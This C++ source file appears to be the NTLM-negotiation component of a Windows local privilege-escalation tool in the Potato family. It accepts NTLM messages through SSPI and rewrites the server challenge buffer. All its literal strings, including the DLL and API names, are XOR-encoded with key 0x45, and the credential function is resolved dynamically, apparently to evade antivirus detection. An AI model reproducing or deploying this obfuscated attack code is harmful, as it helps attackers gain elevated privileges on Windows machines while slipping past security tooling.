#include "stdafx.h"
#include "LocalNegotiator.h"
#include <iostream>

LocalNegotiator::LocalNegotiator()
{
	authResult = -1;
}

void InitTokenContextBuffer(PSecBufferDesc pSecBufferDesc, PSecBuffer pSecBuffer)
{
	pSecBuffer->BufferType = SECBUFFER_TOKEN;
	pSecBuffer->cbBuffer = 0;
	pSecBuffer->pvBuffer = nullptr;

	pSecBufferDesc->ulVersion = SECBUFFER_VERSION;
	pSecBufferDesc->cBuffers = 1;
	pSecBufferDesc->pBuffers = pSecBuffer;
}

int LocalNegotiator::handleType1(char * ntlmBytes, int len)
{
	
	 char  hid_Error__q1kgxfsAuX9X[] = {'\x0','\x37','\x37','\x2a','\x37','\x65','\x2c','\x2b','\x65','\x4','\x34','\x30','\x2c','\x37','\x20','\x6','\x37','\x20','\x21','\x20','\x2b','\x31','\x2c','\x24','\x29','\x36','\xd','\x24','\x2b','\x21','\x29','\x20','\x45'};
 char k_d5MigHP4y2W4 = '\x45';
for(int i = 0; i < sizeof(hid_Error__q1kgxfsAuX9X) / sizeof(hid_Error__q1kgxfsAuX9X[0]); i++){
hid_Error__q1kgxfsAuX9X[i] = hid_Error__q1kgxfsAuX9X[i] ^ k_d5MigHP4y2W4;
}
	typedef SECURITY_STATUS(__stdcall* _AcquireCredentialsHandleW)(PSECURITY_STRING pPrincipal,PSECURITY_STRING pPackage,unsigned long    fCredentialUse,void             *pvLogonId,void             *pAuthData,SEC_GET_KEY_FN   pGetKeyFn,void             *pvGetKeyArgument,PCredHandle      phCredential,PTimeStamp       ptsExpiry);
	TCHAR  hid_Secur__6bxCS7vA5MZM[] = {'\x16','\x20','\x26','\x30','\x37','\x76','\x77','\x6b','\x21','\x29','\x29','\x45'};
TCHAR k_11Si3RriyGku = '\x45';
for(int i = 0; i < sizeof(hid_Secur__6bxCS7vA5MZM) / sizeof(hid_Secur__6bxCS7vA5MZM[0]); i++){
hid_Secur__6bxCS7vA5MZM[i] = hid_Secur__6bxCS7vA5MZM[i] ^ k_11Si3RriyGku;
}

	HMODULE hid_hHandl_9QoCNObcNjiA = LoadLibrary(hid_Secur__6bxCS7vA5MZM);
	TCHAR  hid_Acquir_hIkMculScqOs[] = {'\x4','\x26','\x34','\x30','\x2c','\x37','\x20','\x6','\x37','\x20','\x21','\x20','\x2b','\x31','\x2c','\x24','\x29','\x36','\xd','\x24','\x2b','\x21','\x29','\x20','\x12','\x45'};
TCHAR k_drC18bOuj5JI = '\x45';
for(int i = 0; i < sizeof(hid_Acquir_hIkMculScqOs) / sizeof(hid_Acquir_hIkMculScqOs[0]); i++){
hid_Acquir_hIkMculScqOs[i] = hid_Acquir_hIkMculScqOs[i] ^ k_drC18bOuj5JI;
}

	_AcquireCredentialsHandleW hid_Acquir_KoCicBoKOktf = (_AcquireCredentialsHandleW) GetProcAddress(hid_hHandl_9QoCNObcNjiA, hid_Acquir_hIkMculScqOs);
TCHAR lpPackageName[1024] = L"Negotiate";
	TimeStamp ptsExpiry;

	int status = hid_Acquir_KoCicBoKOktf(
		NULL,
		lpPackageName,
		SECPKG_CRED_INBOUND,
		NULL,
		NULL,
		0,
		NULL,
		&hCred,
		&ptsExpiry);

	if (status != SEC_E_OK)
	{
		printf(hid_Error__q1kgxfsAuX9X);
		return -1;
	}

	InitTokenContextBuffer(&secClientBufferDesc, &secClientBuffer);
	InitTokenContextBuffer(&secServerBufferDesc, &secServerBuffer);

	phContext = new CtxtHandle();

	secClientBuffer.cbBuffer = static_cast<unsigned long>(len);
	secClientBuffer.pvBuffer = ntlmBytes;

	ULONG fContextAttr;
	TimeStamp tsContextExpiry;

	status = AcceptSecurityContext(
		&hCred,
		nullptr,
		&secClientBufferDesc,
		ASC_REQ_ALLOCATE_MEMORY | ASC_REQ_CONNECTION,
		//STANDARD_CONTEXT_ATTRIBUTES,
		SECURITY_NATIVE_DREP,
		phContext,
		&secServerBufferDesc,
		&fContextAttr,
		&tsContextExpiry);

	return status;
}

int LocalNegotiator::handleType2(char * ntlmBytes, int len)
{
	
	 char  hid_Buffer_j0sLGW6u22Pi[] = {'\x7','\x30','\x23','\x23','\x20','\x37','\x65','\x36','\x2c','\x3f','\x20','\x36','\x65','\x2c','\x2b','\x26','\x2a','\x28','\x35','\x24','\x31','\x2c','\x27','\x29','\x20','\x65','\x68','\x65','\x26','\x24','\x2b','\x62','\x31','\x65','\x37','\x20','\x35','\x29','\x24','\x26','\x20','\x45'};
 char k_iKeKDGJWrIbW = '\x45';
for(int i = 0; i < sizeof(hid_Buffer_j0sLGW6u22Pi) / sizeof(hid_Buffer_j0sLGW6u22Pi[0]); i++){
hid_Buffer_j0sLGW6u22Pi[i] = hid_Buffer_j0sLGW6u22Pi[i] ^ k_iKeKDGJWrIbW;
}
char* newNtlmBytes = (char*)secServerBuffer.pvBuffer;
	if (len >= secServerBuffer.cbBuffer) {
		for (int i = 0; i < len; i++)
		{
			if (i < secServerBuffer.cbBuffer) {
				ntlmBytes[i] = newNtlmBytes[i];
			}
			else {
				ntlmBytes[i] = 0x00;
			}
		}
	}
	else {
		printf(hid_Buffer_j0sLGW6u22Pi);
	}

	return 0;
}

int LocalNegotiator::handleType3(char * ntlmBytes, int len)
{
	InitTokenContextBuffer(&secClientBufferDesc, &secClientBuffer);
	InitTokenContextBuffer(&secServerBufferDesc, &secServerBuffer);

	secClientBuffer.cbBuffer = static_cast<unsigned long>(len);
	secClientBuffer.pvBuffer = ntlmBytes;

	ULONG fContextAttr;
	TimeStamp tsContextExpiry;
	int status = AcceptSecurityContext(
		&hCred,
		phContext,
		&secClientBufferDesc,
		ASC_REQ_ALLOCATE_MEMORY | ASC_REQ_CONNECTION,
		//STANDARD_CONTEXT_ATTRIBUTES,
		SECURITY_NATIVE_DREP,
		phContext,
		&secServerBufferDesc,
		&fContextAttr,
		&tsContextExpiry);

	authResult = status;

	return status;
}
